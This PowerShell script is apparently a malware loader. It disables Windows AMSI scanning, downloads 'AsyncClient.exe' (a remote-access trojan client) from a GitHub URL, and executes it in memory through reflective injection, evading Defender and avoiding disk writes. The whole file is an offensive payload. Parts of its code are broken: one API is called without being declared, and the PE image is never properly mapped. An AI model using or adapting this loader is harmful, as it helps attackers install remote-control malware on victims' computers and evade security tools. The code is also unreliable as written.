# run.ps1 - Downloads and runs AsyncClient.exe in memory
# Uses reflective PE injection (no disk write)

$url = "https://github.com/lostakram123/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB/raw/refs/heads/main/AsyncClient.exe"

# AMSI bypass (helps if Windows Defender is active)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Download the payload as bytes
$bytes = (New-Object Net.WebClient).DownloadData($url)

# Define the reflective injection code
$script = @'
using System;
using System.Runtime.InteropServices;
public class ReflectiveExec {
    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint allocType, uint protect);
    [DllImport("kernel32", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr addr, byte[] buffer, uint size, out IntPtr bytesWritten);
    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr threadId);
    [DllImport("kernel32", SetLastError = true)]
    public static extern bool VirtualProtect(IntPtr addr, uint size, uint newProtect, out uint oldProtect);
    [DllImport("kernel32", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();
}
'@
Add-Type -TypeDefinition $script -Language CSharp

# Parse PE headers to find entry point
$dos = [System.BitConverter]::ToUInt16($bytes, 0)
if ($dos -ne 0x5A4D) { Write-Error "Invalid DOS header"; exit }
$e_lfanew = [System.BitConverter]::ToInt32($bytes, 0x3C)
$nt = [System.BitConverter]::ToUInt32($bytes, $e_lfanew)
if ($nt -ne 0x00004550) { Write-Error "Invalid NT header"; exit }
$oepRVA = [System.BitConverter]::ToInt32($bytes, $e_lfanew + 0x28)      # x64: AddressOfEntryPoint
$imageBase = [System.BitConverter]::ToInt64($bytes, $e_lfanew + 0x30)   # x64: ImageBase
$sizeOfImage = [System.BitConverter]::ToInt32($bytes, $e_lfanew + 0x50) # x64: SizeOfImage

# Allocate memory (RW)
$hProc = [ReflectiveExec]::GetCurrentProcess()
$ptr = [ReflectiveExec]::VirtualAlloc([IntPtr]::Zero, $sizeOfImage, 0x3000, 0x04)  # MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
if ($ptr -eq [IntPtr]::Zero) { Write-Error "Allocation failed"; exit }

# Write the entire PE image
$bytesWritten = [IntPtr]::Zero
$result = [ReflectiveExec]::WriteProcessMemory($hProc, $ptr, $bytes, $bytes.Length, [ref]$bytesWritten)
if (-not $result) { Write-Error "Write failed"; exit }

# Change protection to EXECUTE_READ
$oldProt = 0
[ReflectiveExec]::VirtualProtect($ptr, $sizeOfImage, 0x20, [ref]$oldProt)  # PAGE_EXECUTE_READ

# Calculate entry point address (base + OEP)
$entryPoint = [IntPtr]::Add($ptr, $oepRVA)

# Create thread at entry point
$hThread = [ReflectiveExec]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $entryPoint, [IntPtr]::Zero, 0, [IntPtr]::Zero)
if ($hThread -eq [IntPtr]::Zero) { Write-Error "Thread creation failed"; exit }

# Wait for the thread to finish (optional)
[ReflectiveExec]::WaitForSingleObject($hThread, 0xFFFFFFFF)  # INFINITE